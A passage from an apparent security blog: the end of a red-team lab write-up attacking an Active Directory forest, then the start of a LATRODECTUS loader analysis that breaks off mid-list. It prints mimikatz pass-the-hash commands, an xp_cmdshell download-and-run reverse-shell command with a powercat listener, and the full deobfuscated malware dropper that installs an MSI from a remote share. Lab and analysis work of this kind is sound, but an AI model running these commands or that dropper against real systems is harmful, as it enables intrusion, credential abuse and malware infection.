currently active sessions.\ntarget 2 leveraging password resets this machine represents a typical UAT server in an enterprise environment. UAT servers are used to test apps in an environment that closely mimic production, allowing users to verify that the software meets requirements before going live.\nthese servers often have looser security controls (compared to production systems). the challenge here is to exploit the delicate balance between functionality + security that UAT environments often struggle with.\nit\u0026rsquo;s clear that UAT servers are critical in the SDLC, but they\u0026rsquo;re often overlooked from a security perspective. they may have elevated privileges to simulate various user roles, and their configurations might be less stringent to facilitate testing. this makes them valuable stepping stones for an attacker moving through a network.\nforcing password change earlier, running BloodHound revealed that the bilal user could force a password change for the UATADMIN user. let\u0026rsquo;s exploit this using PowerView.\nPS C:\\bilal\\AD\u0026gt; Set-DomainUserPassword -Identity UATADMIN -Verbose cmdlet Set-DomainUserPassword at command pipeline position 1 Supply values for the following parameters: AccountPassword: ******** VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user \u0026#39;UATADMIN\u0026#39; VERBOSE: [Set-DomainUserPassword] Password for user \u0026#39;UATADMIN\u0026#39; successfully reset this PowerView command allows me to forcibly change the password of another user\u0026rsquo;s account. usually, this ability rests with IT for support purposes but can be a significant risk if not properly controlled. by changing the password, i can gain access to a more privileged account.\nusing mimikatz, i can perform an overpass-the-hash attack. this is when an attacker isn\u0026rsquo;t able to access the cleartext password of a target, but can acquire a Kerberos ticket armed with just the NTLM hash of the password.\nPS C:\\bilal\\AD\u0026gt; Invoke-Mimikatz -Command \u0026#34;sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe\u0026#34; .#####. mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ** Kitten Edition ** ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz(powershell) # sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe user : uatadmin domain : nebula.cosmos.local program : powershell.exe impers. : no NTLM : 271b74be505cd48cef768d0d973e59e7 | PID 4428 | TID 1292 | LSA Process is now R/W | LUID 0 ; 1820938 (00000000:001bc90a) \\_ msv1_0 - data copy @ 0000026480392C00 : OK ! \\_ kerberos - data copy @ 0000026480082500 \\_ aes256_hmac -\u0026gt; null \\_ aes128_hmac -\u0026gt; null \\_ rc4_hmac_nt OK \\_ rc4_hmac_old OK \\_ rc4_md4 OK \\_ rc4_hmac_nt_exp OK \\_ rc4_hmac_old_exp OK \\_ *Password replace @ 0000026481000000 (32) -\u0026gt; null using the NTLM hash instead of the password to authenticate launches a new PowerShell process that runs with the UATADMIN credentials.\ni can then add bilal to the local Administrators group on both the UATADMIN and UATSRV machines.\nPS C:\\Windows\\system32\u0026gt; $sess = New-PSSession -ComputerName uatsrv.nebula.cosmos.local PS C:\\Windows\\system32\u0026gt; Enter-PSSession -Session $sess [uatsrv.nebula.cosmos.local]: PS C:\\Users\\uatadmin\\Documents\u0026gt; net localgroup administrators /add nebula\\bilal The command completed successfully. enable RDP finally, let\u0026rsquo;s enable RDP on the machine. i\u0026rsquo;ll modify the Windows Registry to allow RDP connections, then enable the necessary firewall rule. this will give me GUI access to the machine, which could come in handy for further exploitation + exfiltration.\n[uatsrv.nebula.cosmos.local]: PS C:\\Users\\uatadmin\\Documents\u0026gt; whoami;hostname nebula\\uatadmin uatsrv [uatsrv.nebula.cosmos.local]: PS C:\\Users\\uatadmin\\Documents\u0026gt; Set-ItemProperty -Path \u0026#39;HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\u0026#39; -name \u0026#34;fDenyTSConnections\u0026#34; -Value 0 [uatsrv.nebula.cosmos.local]: PS C:\\Users\\uatadmin\\Documents\u0026gt; Enable-NetFirewallRule -DisplayGroup \u0026#34;Remote Desktop\u0026#34; [uatsrv.nebula.cosmos.local]: PS C:\\Users\\uatadmin\\Documents\u0026gt; netsh advfirewall firewall add rule name=\u0026#34;allow RemoteDesktop\u0026#34; dir=in protocol=TCP localport=3389 action=allow Ok. [uatsrv.nebula.cosmos.local]: PS C:\\Users\\uatadmin\\Documents\u0026gt; Test-NetConnection 172.16.10.1 -CommonTCPPort rdp target 3 sql server exploitation this is a dev server that hosts critical database services. dev servers are used by engineers to build + test apps before moving them to production.\nthese environments usually contain valuable intellectual property (code) and have direct connections to production systems. let\u0026rsquo;s look for more information the SQL Server setup. you can do this with PowerUpSQL.ps1.\nPS C:\\ad\\tools\\PowerUpSQL-master\u0026gt;Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose VERBOSE: Creating runspace pool and session states VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success. VERBOSE: USER : Connection Failed. VERBOSE: Closing the runspace pool ComputerName Instance Status ------------ -------- ------ devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local,1433 Accessible USER USER Not Accessible PS C:\\ad\\tools\\PowerUpSQL-master\u0026gt; Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success. ComputerName : devsrv.nebula.cosmos.local Instance : DEVSRV DomainName : nebula ServiceProcessID : 2576 ServiceName : MSSQLSERVER ServiceAccount : nebula\\devsqladmin AuthenticationMode : Windows and SQL Server Authentication ForcedEncryption : 0 Clustered : No SQLServerVersionNumber : 14.0.1000.169 SQLServerMajorVersion : 2017 SQLServerEdition : Developer Edition (64-bit) SQLServerServicePack : RTM OSArchitecture : X64 OsMachineType : ServerNT OSVersionName : Windows Server 2016 Standard OsVersionNumber : SQL CurrentLogin : nebula\\uatadmin IsSysadmin : Yes ActiveSessions : 1 PS C:\\bilal\\AD\u0026gt; Get-SQLServerLinkCrawl -Instance devsrv.nebula.cosmos.local -Verbose VERBOSE: devsrv.nebula.cosmos.local : Connection Success. VERBOSE: devsrv.nebula.cosmos.local : Connection Success. VERBOSE: ------------------------------------------ VERBOSE: Server: DEVSRV VERBOSE: ------------------------------------------ VERBOSE: - Link Path to server: DEVSRV luckily for me, i have sysadmin rights on this instance. meaning i can run OS commands, like whoami on the machine.\nPS C:\\bilal\\AD\u0026gt; Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command whoami ComputerName Instance CommandResults ------------ -------- --------- devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local nebula\\devsqladmin backdoor i\u0026rsquo;m now going to build a backdoor into this instance. to do this, i\u0026rsquo;ll set up a PowerCat listener and use a PowerShell reverse shell script.\nPS C:\\bilal\\AD\u0026gt; Get-SQLServerLinkCrawl -Instance devsrv.Nebula.Cosmos.local -Query \u0026#39;exec master..xp_cmdshell \u0026#34;powershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://172.16.10.1/Invoke-PowerShellTCP-reverse.ps1\u0026#39;\u0026#39;)\u0026#34;\u0026#39; PS C:\\bilal\\AD\u0026gt; Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command \u0026#34;powershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://172.16.10.1/Invoke-PowerShellTcp-reverse.ps1\u0026#39;)\u0026#34; ComputerName Instance CommandResults ------------ -------- -------------- devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local PS C:\\bilal\\AD\u0026gt; powercat -l -v -p 443 -t 555555 VERBOSE: Set Stream 1: TCP VERBOSE: Set Stream 2: Console VERBOSE: Setting up Stream 1... VERBOSE: Listening on [0.0.0.0] (port 443) VERBOSE: Connection from [172.16.3.31] port [tcp] accepted (source port 49718) VERBOSE: Setting up Stream 2... VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams... Windows PowerShell running as user devsqladmin on DEVSRV Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u0026gt; PS C:\\Windows\\system32\u0026gt; PS C:\\Windows\\system32\u0026gt; PS C:\\Windows\\system32\u0026gt; whoami nebula\\devsqladmin PS C:\\Windows\\system32\u0026gt; the entire process is as follows:\nexploit the SQL Server links to access other linked SQL Servers.\nexecute xp_cmdshell, which will allow me to execute OS commands.\ndownload + execute a reverse shell script that will give me a reverse shell on DEVSRV as the DEVSQLADMIN user.\nstay tuned for part 2, where i takeover the production server and domain controllers!\n","date":"2024-09-19","permalink":"//localhost:1313/posts/cosmos-1/","section":"","summary":"","tags":[],"title":"cosmos, part 1: red-teaming corporate active directory forests"},{"categories":[],"contents":" LATRODECTUS is an emerging malware loader that i first encountered during my research at the start of 2024. initially discovered by walmart\u0026rsquo;s security team, it quickly gained attention due to the similarities it held with ICEDID, particularly in the use of a command handler for downloading and executing encrypted payloads. proofpoint and team cymru both established a link between the network infrastructure used by operators of both LATRODECTUS and ICEDID, suggesting a common origin.\nLATRODECTUS is a simple + efficient malware, that\u0026rsquo;s part of a new trend in malware development, where the emphasis is on lightweight, direct-action tools. it contains only 11 command handlers, focused on tasks like enumeration + execution.\ninfection infection typically begins with a spam email that points (via URL or PDF) to an oversized JavaScript dropper.\nonce executed, the dropper leverages WMI [Windows Management Instrumentation] to invoke msiexec.exe, which then downloads + installs an .msi file from a remote WebDAV share.\nthis .msi file is responsible for executing LATRODECTUS on the target. when the .msi is executed, it executes a packed DLL which further obfuscates its presence by copying itself to a different location and executing from there.\nwhen it\u0026rsquo;s re-executed, the DLL establishes a connection back to the C2 server for further comms.\nstage 1: the [obfuscated] dropper i grabbed the dropper from MalwareBazaar: hxxps[://]bazaar[.]abuse[.]ch/sample/4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f/\nthis is a javascript based dropper. it\u0026rsquo;s heavily commented and obfuscated, with real commands being preceded by ////.\nhere\u0026rsquo;s a snapshot of the code.\nonce the pattern is figured out, a regex-based python script is enough to clean it up.\nimport re def extract_code_lines(input_file, output_file): # open input file + read all lines with open(input_file, \u0026#39;r\u0026#39;) as file: lines = file.readlines() # hold the extracted lines of legitimate code code_lines = [] # iterate over each line to determine if it\u0026#39;s legitimate code for line in lines: # check if line starts with \u0026#34;////\u0026#34; or doesn\u0026#39;t start with \u0026#34;//\u0026#34; if line.startswith(\u0026#39;////\u0026#39;): # remove leading four slashes + any extra spaces, then add to code lines code_lines.append(line[4:].lstrip()) elif not line.startswith(\u0026#39;//\u0026#39;): # if line doesn\u0026#39;t start with \u0026#34;//\u0026#34;, it\u0026#39;s legitimate code, add it as is code_lines.append(line) # write extracted code lines to output file with open(output_file, \u0026#39;w\u0026#39;) as file: file.writelines(code_lines) # example input_file = \u0026#39;4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f.js\u0026#39; # replace with input file name output_file = \u0026#39;dropper-clean.js\u0026#39; # replace with output file name extract_code_lines(input_file, output_file) this script outputs to a cleaned-up file, which is the unobfuscated dropper.\nstage 2: the [unobfuscated] dropper var network = new ActiveXObject(\u0026#34;WScript.Network\u0026#34;); var wmi = GetObject(\u0026#34;winmgmts:\\\\\\\\.\\\\root\\\\cimv2\u0026#34;); var attempt = 0; var connected = false; var driveLetter, letter; function isDriveMapped(letter) { var drives = network.EnumNetworkDrives(); for (var i = 0; i \u0026lt; drives.length; i += 2) { if (drives.Item(i) === letter) { return true; } } return false; } for (driveLetter = 90; driveLetter \u0026gt;= 65 \u0026amp;\u0026amp; !connected; driveLetter--) { letter = String.fromCharCode(driveLetter) + \u0026#34;:\u0026#34;; if (!isDriveMapped(letter)) { try { network.MapNetworkDrive(letter, \u0026#34;\\\\\\\\95.164.3.171@80\\\\share\\\\\u0026#34;); connected = true; break; } catch (e) { attempt++; } } } if (!connected \u0026amp;\u0026amp; attempt \u0026gt; 5) { var command = \u0026#39;net use \u0026#39; + letter + \u0026#39; \\\\\\\\95.164.3.171@80\\\\share\\\\ /persistent:no\u0026#39;; wmi.Get(\u0026#34;Win32_Process\u0026#34;).Create(command, null, null, null); var startTime = new Date(); while (new Date() - startTime \u0026lt; 3000) {} connected = isDriveMapped(letter); } if (connected) { var installCommand = \u0026#39;msiexec.exe /i \\\\\\\\95.164.3.171@80\\\\share\\\\cisa.msi /qn\u0026#39;; wmi.Get(\u0026#34;Win32_Process\u0026#34;).Create(installCommand, null, null, null); try { network.RemoveNetworkDrive(letter, true, true); } catch (e) { } } else { WScript.Echo(\u0026#34;Failed.\u0026#34;); } var fsObj = new ActiveXObject(\u0026#34;Scripting.FileSystemObject\u0026#34;); var selfPath = WScript.ScriptFullName; try { if (fsObj.FileExists(selfPath)) { var selfFile = fsObj.OpenTextFile(selfPath, 1); var codeToExecute = \u0026#34;\u0026#34;; while (!selfFile.AtEndOfStream) { var currentLine = selfFile.ReadLine(); if (currentLine.indexOf(\u0026#34;////\u0026#34;) === 0) { codeToExecute += currentLine.substring(4) + \u0026#34;\\n\u0026#34;; } } selfFile.Close(); if (codeToExecute) { var executeFunction = new Function(codeToExecute); executeFunction(); } } } catch (error) { } the unobfuscated dropper is now ready for analysis. some indicators of compromise (IoCs) to look for are 45.95.11.134:80 connecting to \\share\\ folder, and using msiexec.exe to grab qual.msi from the above C2 server.\nOrca (provided by the Windows SDK) can be used to analyze or edit qual.msi. head over to CustomAction to view the LaunchFile target. this launches a file: rundll32.exe. its export entry is vgml and it\u0026rsquo;s stored at LocalAppDataFolder\\stat\\falcon.dll.\nyou could also use UniExtract to extract qual.msi. it will create the directory LocalAppDataFolder\\stat\\falcon.dll. i copied the DLL to a separate directory for analysis. this commences stage 3.\nstage 3: falcon.dll this is a packed DLL that contains another DLL inside it, which is the main payload.\nyou can use x64dbg, IDA, or Binary Ninja to analyze the DLL and payload. i used a combo of IDA and Binary Ninja.\nopen rundll32.exe. remove all breakpoints and change the command line: remove the old path and add the new path (falcon.dll) and restart.\nselect user DLL entry and user DLL load in preferences. keep hitting play until the name of the module (falcon.dll) is displayed.\nfollow the expression vgml (ctrl + g) and set a breakpoint at 18000D960.\nfollow VirtualAlloc and scroll down to find ret. set a breakpoint at 7FFA8FCFE5DA.\nfollow VirtualProtect and set a breakpoint at 7FFA90D1BF80.\nnow, hit play until the first breakpoint (VirtualAlloc ret) is hit. take the RAX value (140FDCD0000) and follow it in Dump #1. hit play again to see the unpacked payload inside the allocated memory.\ncaution: hitting play again would execute the payload. so dump it first by following the address 140FDCD0000 in Memory Map then dump the memory to a file and save it. this commences stage 4.\nstage 4: the payload examine the generated rundll32_00000140FDCD0000.bin in IDA by going to Exports and selecting any of the entries to then open the decompiler. hit run at 180003CE4, ordinal 3. enter the functions to check the hashes being declared and resolved to confirm that this is indeed the final payload.\nfirst, make sure everything is decompiled properly: produce file -\u0026gt; create C file [ctrl+f5]. this forces IDA to decompile the binary.\nhead to exports and select the run function. use the decompiler and disassembly side-by-side (you can hit F5 to open the disassembly window).\nenter the first function inside the disassembly: sub_180003CB4();. inside it, there\u0026rsquo;s another function sub_180003868();. enter that. we\u0026rsquo;ll forego the first function [sub_18000AC6C();] for now and head to the second function: sub_180006298();.\nfunctions sub_180006298(); is defined as follows.\n__int64 sub_180006298() { if ( (unsigned int)sub_180008388() \u0026amp;\u0026amp; (unsigned int)sub_18000AA30() \u0026amp;\u0026amp; (unsigned int)sub_18000A3F8() \u0026amp;\u0026amp; (unsigned int)sub_180008328() \u0026amp;\u0026amp; (unsigned int)sub_18000A2D8() \u0026amp;\u0026amp; (unsigned int)sub_180008EF0() ) { return sub_18000AAAC; } else { return 0LL; } } let\u0026rsquo;s go through each of the functions here and try to decipher what\u0026rsquo;s going on.\nsub_180008388() __int64 sub_180008388() { int i; // [rsp+20h] [rbp-28h] for ( i = 0; !i; i = 1 ) { unk_180010EB0 = sub_18000821C(0x2ECA438C); if ( !unk_180010EB0 ) return 0LL; } return 1LL; } sub_180000821C() examining sub_180000821C() shows that it iterates through the modules loaded in the executable.\nstruct _LIST_ENTRY *__fastcall sub_18000821C(int a1) { unsigned int v2; // [rsp+20h] [rbp-28h] struct _LIST_ENTRY *i; // [rsp+28h] [rbp-20h] _WORD *v4; // [rsp+30h] [rbp-18h] for ( i = sub_180008534()-\u0026gt;Ldr-\u0026gt;InLoadOrderModuleList.Flinkl i[3].Flink) { v4 = sub_18000BB0C((__int64)i[6].Flink, LOWORD(i[5].Blink)); v2 = 2 * sub_18000B8C0((int64)v4); if ( (unsigned int)sub_180006A14((__int64)v4, v2) == a1 ) return i[3].Flink; } return 0LL; } follow the hash there\u0026rsquo;s a hash [0x2ECA438C] being passed to the function unk_180010EB0() via the function sub_18000821C(). we can use this \u0026ldquo;canary\u0026rdquo; of a hash to find out where else it pops up in the program. x64dbg has a fantastic plugin called HashDB Hunt Algorithm. this feature reveals that the the algorithm crc32 [32B in size] also contains the hash.\nHashDB Lookup is another feature that can find what module this hash corresponds to. it tells us that the hash matches that of kernel32.dll, and adds it to the enums.\nso: 0x2ECA438C can now be resolved to the module kernel32.dll; the address sub_180008388() can be resolved to mw_resolve_kernel32.dll; the address unk_180010EB0 can be resolved to mw_handle_kernel32_dll. by inference, we can resolve sub_180000821C() to mw_get_module_handle().\nwe can now rewrite the function sub_1800008388().\n__int64 mw_resolve_kernel32_dll() { int i; // [rsp+20h] [rbp-28h] for ( i = 0; !i; i = 1 ) { mw_handle_kernel32_dll = mw_get_module_handle(kernel32_dll); if ( !mw_handle_kernel32_dll ) return 0LL; } return 1LL; } resolving modules + functions there is another hash [0x26797E77] being passed to the function unk_180010EB8() via sub_18000821C() (now called mw_get_module_handle()).\n__int64 sub_18000AA30() { int i; // [rsp+20h] [rbp-28h] for ( i = 0; !i; i = 1 ) { unk_180010EB8 = mw_get_module_handle(0x26797E77); if ( !unk_180010EB8 ) return 0LL; } return 1LL; } using HashDB Hunt Algorithm + HashDB Lookup again reveals the hash inside the crc32 algorithm, and that the hash corresponds to ntdll.dll!\nso: 0x26797E77 can be resolved to ntdll_dll; unk_180010EB8() can be resolved to mw_handle_ntdll_dll(); sub_18000AA30() can be resolved to mw_resolve_ntdll_dll().\n__int64 mw_resolve_ntdll_dll() { int i; // [rsp+20h] [rbp-28h] for ( i = 0; !i; i = 1 ) { mw_handle_ntdll_dll = mw_get_module_handle(ntdll_dll); if ( !mw_handle_ntdll_dll ) return 0LL; } return 1LL; } NT APIs sub_18000A3F8() is a large function that contains several hashes, and shows mw_handle_ntdll_dll being used.\n[\u0026#34;... this pattern continues above\u0026#34;] int v110; // [rsp+390h] [rbp-28h] void *v111; // [rsp+398h] [rbp-20h] __int64 (__fastcall **v112)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD) v2[0] = -529125397; v3 = \u0026amp;mw_handle_ntdll_dll; v4 = \u0026amp;qword_180010A10; v5 = -1268447051; v6 = \u0026amp;mw_handle_ntdll_dll; v7 = \u0026amp;qword_1800109C8; v8 = -898953861; v9 = \u0026amp;mw_handle_ntdll_dll; v10 = \u0026amp;unk_1800109D0; v11 = -1513862064; v12 = \u0026amp;mw_handle_ntdll_dll; v13 = \u0026amp;qword_1800109D8; v14 = 823342452; v15 = \u0026amp;mw_handle_ntdll_dll; v16 = \u0026amp;unk_180010A70; v17 = 96068967; v18 = \u0026amp;mw_handle_ntdll_dll; [\u0026#34;... this pattern continues until v112\u0026#34;] for ( i = 0; i \u0026lt; 0x25uLL; ++ i ) *(\u0026amp;v4)[3 * i ] = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD)sub_180008540(*(_QWORD *)*(\u0026amp;v3 + 3 * i), v2[6 * i], 0)); return 1LL; depending on your level of experience with a function like this, it can signal different things. one of the main ideas should be that it\u0026rsquo;s probably resolving Nt-level (i.e. Native). the Windows Native API is an abstraction layer that sits between the OS kernel, and the Win32 API. it\u0026rsquo;s exported from ntdll.dll (in the system32 folder), with the exports being stubs for the kernel.\nsimply put, the NT API is a convenient and fast way for user-mode applications to communicate with kernel-mode functions and processes.\nlet\u0026rsquo;s start to analyze this the same way as i\u0026rsquo;ve done previously: the hash.\nhitting H on the first hash will convert it to hex: v2[0] = 0xE0762FEB;. looking up this hash finds a match: NtAllocateVirtualMemory. thus, we can rewrite the value of v2[0]: v2[0] = NtAllocateVirtualMemory_0;.\nanother clue to help in deciphering this function is at the bottom.\nfor ( i = 0; i \u0026lt; 0x25uLL; ++ i ) *(\u0026amp;v4)[3 * i ] = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD)sub_180008540(*(_QWORD *)*(\u0026amp;v3 + 3 * i), v2[6 * i], 0)); both v2[0] and v3 are being passed to a function sub_180008540(). this would imply that the _QWORD that appears at every 3rd value (like v4 = \u0026amp;qword_180010A10) is actually the address of the API function referenced at the 1st value. using this logic, we can rename v2[0], v3, and v4 as:\nv2[0] = NtAllocateVirtualMemory_0; v3 = \u0026amp;mw_handle_ntdll_dll; v4 = \u0026amp;mw_addr_NtAllocateVirtualMemory; at this point, a pattern should emerge: this large function\u0026rsquo;s mission is to resolve all the Dynamic APIs needed for the malware to work. the first value is the name of the API, the second value is getting the handle of the API, and the third value is the memory address of the API.\nrepeating the above steps for the rest of the functions should now be straightforward. remember, every second value is \u0026amp;mw_handle_ntdll_dll, which i\u0026rsquo;m not going to include in the code below (but it\u0026rsquo;s still needed).\nv5 = RtlGetVersion_0; v7 = \u0026amp;mw_addr_RtlGetVersion; v8 = NtCreateThread_0; v10 = \u0026amp;mw_addr_NtCreateThread; v11 = NtQueryInformationProcess_0; v13 = \u0026amp;mw_addr_NtQueryInformationProcess; v14 = NtQueryInformationThread_0; v16 = \u0026amp;mw_addr_NtQueryInformationThread; v17 = NtCreateUserProcess_0; v19 = \u0026amp;mw_addr_NtCreateUserProcess; v20 = NtMapViewOfSection_0; v22 = \u0026amp;mw_addr_NtMapViewOfSection; v23 = NtCreateSection_0; v25 = \u0026amp;mw_addr_NtCreateSection; v26 = LdrLoadDll_0; v28 = \u0026amp;mw_addr_LdrLoadDll; v29 = LdrGetDllHandle_0; v31 = \u0026amp;mw_addr_LdrGetDllHandle; v32 = NtWriteVirtualMemory_0; v34 = \u0026amp;mw_addr_NtWriteVirtualMemory; v35 = NtProtectVirtualMemory_0; v37 = \u0026amp;mw_addr_NtProtectVirtualMemory; v38 = NtDeviceIoControlFile_0; v40 = \u0026amp;mw_addr_NtDeviceIoControlFile; v41 = NtSetContextThread_0; v43 = \u0026amp;mw_addr_NtSetContextThread; v44 = NtOpenProcess_0; v46 = \u0026amp;mw_addr_NtOpenProcess; v47 = NtClose_0; v49 = \u0026amp;mw_addr_NtClose; v50 = NtCreateFile_0; v52 = \u0026amp;mw_addr_NtCreateFile; v53 = NtOpenFile_0; v55 = \u0026amp;mw_addr_NtOpenFile; v56 = NtDeleteFile_0; v58 = \u0026amp;mw_addr_NtDeleteFile; v59 = NtReadVirtualMemory_0; v61 = \u0026amp;mw_addr_NtReadVirtualMemory; v62 = NtQueryVirtualMemory_0; v64 = \u0026amp;mw_addr_NtQueryVirtualMemory; v65 = NtOpenThread_0; v67 = \u0026amp;mw_addr_NtOpenThread; v68 = NtResumeThread_0; v70 = \u0026amp;mw_addr_NtResumeThread; v71 = NtFreeVirtualMemory_0; v73 = \u0026amp;mw_addr_NtFreeVirtualMemory; v74 = NtFlushInstructionCache_0; v76 = \u0026amp;mw_addr_NtFlushInstructionCache; v77 = RtlRandomEx_0; v79 = \u0026amp;mw_addr_RtlRandomEx; v80 = NtQuerySystemInformation_0; v82 = \u0026amp;mw_addr_NtQuerySystemInformation; v83 = LdrQueryProcessModuleInformation_0; v85 = \u0026amp;mw_addr_LdrQueryProcessModuleInformation; v86 = RtlInitUnicodeString_0; v88 = \u0026amp;mw_addr_RtlInitUnicodeString; v89 = NtWriteFile_0; v91 = \u0026amp;mw_addr_NtWriteFile; v92 = NtReadFile_0; v94 = \u0026amp;mw_addr_NtReadFile; v95 = NtDelayExecution_0; v97 = \u0026amp;mw_addr_NtDelayExecution; v98 = NtOpenKey_0; v100 = \u0026amp;mw_addr_NtOpenKey; v101 = NtSetValueKey_0; v103 = \u0026amp;mw_addr_NtSetValueKey; v104 = NtQueryValueKey_0; v106 = \u0026amp;mw_addr_NtQueryValueKey; v107 = RtlFormatCurrentUserKeyPath_0; v109 = \u0026amp;mw_addr_RtlFormatCurrentUserKeyPath; v110 = NtQueryInformationFile_0; v112 = \u0026amp;mw_addr_NtQueryInformationFile; what do these APIs do? the large function sub_18000A3F8() can now be resolved to mw_resolve_ntapi(), as it\u0026rsquo;s clearly attempting to interact with low-level system operations: functionalities like memory management, thread/process manipulation, file + I/O operations, registry access, information gathering, etc.\nhere\u0026rsquo;s a breakdown of what each of these APIs do.\nNtAllocateVirtualMemory_0 v2[0] = NtAllocateVirtualMemory_0; this allocates memory in the virtual address space of a process. it\u0026rsquo;s essential for managing memory dynamically within a process, as it allows the allocation of memory regions.\nLATRODECTUS probably uses this API to allocate memory where it can load/inject its payload. as i\u0026rsquo;ve talked about in an earlier post, this is a critical step in process injection techniques: malware needs to create space in a target process\u0026rsquo;s memory to insert + execute its code.\nv2[0] means that the first element of the v2 array is assigned the hash (or identifier) of the NtAllocateVirtualMemory function.\nRtlGetVersion_0 v5 = RtlGetVersion_0; v7 = \u0026amp;mw_addr_RtlGetVersion; gets version information about current OS. can be used to check OS version + tailor behaviour based on versions.\nNtCreateThread_0 v8 = NtCreateThread_0; v10 = \u0026amp;mw_addr_NtCreateThread; creates a new thread within the current process (or a remote process). can be used to spawn threads for running payloads, or inject code into other processes.\nNtQueryInformationProcess_0 v11 = NtQueryInformationProcess_0; v13 = \u0026amp;mw_addr_NtQueryInformationProcess; gets information about a process: memory usage, exit status, privileges. can be used to collect details about a process.\nNtQueryInformationThread_0 v14 = NtQueryInformationThread_0; v16 = \u0026amp;mw_addr_NtQueryInformationThread; gets information about a thread: priority, base priority, processor affinity. can be used to inspect its own threads or those of another process.\nNtCreateUserProcess_0 v17 = NtCreateUserProcess_0; v19 = \u0026amp;mw_addr_NtCreateUserProcess; creates a new process with specific attributes. can be used to spawn a new process.\nNtMapViewOfSection_0 v20 = NtMapViewOfSection_0; v22 = \u0026amp;mw_addr_NtMapViewOfSection; maps a view of a section [range of memory] into the address space of a calling process, or another process. this is used in process injection techniques.\nNtCreateSection_0 v23 = NtCreateSection_0; v25 = \u0026amp;mw_addr_NtCreateSection; creates a section object, which is used to share memory between processes or to map files into memory. can be used with NtMapViewOfSection for advanced process injection or file mapping.\nLdrLoadDll_0 v26 = LdrLoadDll_0; v28 = \u0026amp;mw_addr_LdrLoadDll; loads a DLL into the address space of the current process. the malware might be dynamically loading additional libraries that it needs to adapt or extend its functionality.\nLdrGetDllHandle_0 v29 = LdrGetDllHandle_0; v31 = \u0026amp;mw_addr_LdrGetDllHandle; gets a handle to a loaded DLL. can be used to check if a DLL is already loaded, or to get a reference to use its functions.\nNtWriteVirtualMemory_0 v32 = NtWriteVirtualMemory_0; v34 = \u0026amp;mw_addr_NtWriteVirtualMemory; writes data to the virtual memory of a process. usually used to inject payload into another process\u0026rsquo;s memory.\nNtProtectVirtualMemory_0 v35 = NtProtectVirtualMemory_0; v37 = \u0026amp;mw_addr_NtProtectVirtualMemory; changes the protection on a region of virtual memory. malware sets the memory permissions to X (executable), allowing the injected code to run.\nNtDeviceIoControlFile_0 v38 = NtDeviceIoControlFile_0; v40 = \u0026amp;mw_addr_NtDeviceIoControlFile; sends a control code directly to a specified device driver, causing the corresponding device to perform a specified operation. can be used for low-level interaction with hardware. maybe to exploit specific vulns or interact with specific drivers.\nNtSetContextThread_0 v41 = NtSetContextThread_0; v43 = \u0026amp;mw_addr_NtSetContextThread; sets the context of a thread. this could be registers, a stack pointer, etc. can be used to hijack a thread\u0026rsquo;s execution or to modify behaviour for process injection.\nNtOpenProcess_0 v44 = NtOpenProcess_0; v46 = \u0026amp;mw_addr_NtOpenProcess; opens a handle to an existing process. can be used to gain access to another process for process injection/monitoring.\nNtClose_0 v47 = NtClose_0; v49 = \u0026amp;mw_addr_NtClose; closes an open handle to a process, thread, or system object. used to close handles for clean up and evading detection.\nNtCreateFile_0 v50 = NtCreateFile_0; v52 = \u0026amp;mw_addr_NtCreateFile; creates/opens a file or I/O device. can be used to open files for reading/writing, probably to drop payloads or access config files.\nNtOpenFile_0 v53 = NtOpenFile_0; v55 = \u0026amp;mw_addr_NtOpenFile; opens a handle to a file or I/O device. similar to NtCreateFile.\nNtDeleteFile_0 v56 = NtDeleteFile_0; v58 = \u0026amp;mw_addr_NtDeleteFile; deletes a file from the file system. can be used to remove traces of malware presence from the system.\nNtReadVirtualMemory_0 v59 = NtReadVirtualMemory_0; v61 = \u0026amp;mw_addr_NtReadVirtualMemory; reads data from the virtual memory of a process. can be used to read the memory of other processes, probably to steal data or gather information.\nNtQueryVirtualMemory_0 v62 = NtQueryVirtualMemory_0; v64 = \u0026amp;mw_addr_NtQueryVirtualMemory; gets information about a region of virtual memory. can be used to inspect the memory layout of its own process or another, probably to map out where to inject or execute code.\nNtOpenThread_0 v65 = NtOpenThread_0; v67 = \u0026amp;mw_addr_NtOpenThread; opens a handle to an existing thread. similar to NtOpenProcess.\nNtResumeThread_0 v68 = NtResumeThread_0; v70 = \u0026amp;mw_addr_NtResumeThread; resumes a suspended thread. can be used to suspend a thread to inject code or modify the context, then resume it to execute the injected code.\nNtFreeVirtualMemory_0 v71 = NtFreeVirtualMemory_0; v73 = \u0026amp;mw_addr_NtFreeVirtualMemory; frees up a region of virtual memory in a process. can be used to free up the memory after exploitation to clean up and reduce the footprint.\nNtFlushInstructionCache_0 v74 = 